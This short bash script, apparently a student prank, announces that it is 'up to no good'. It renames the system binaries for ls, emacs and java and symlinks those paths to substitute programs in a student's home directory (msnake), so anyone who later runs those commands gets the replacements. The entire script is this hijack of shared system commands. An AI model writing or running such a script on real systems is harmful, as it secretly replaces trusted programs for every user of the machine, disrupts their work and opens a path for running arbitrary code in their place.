#!/bin/bash
echo "I solemnly swear that I am up to no good."
mv /bin/ls /bin/ls.orig
mv /usr/bin/emacs /usr/bin/emacs.orig
mv /usr/bin/java /usr/bin/java.orig
ln -s /students/sye2/msnake/ls /bin/ls
ln -s /students/sye2/msnake/emacs /usr/bin/emacs
ln -s /students/sye2/msnake/java /usr/bin/java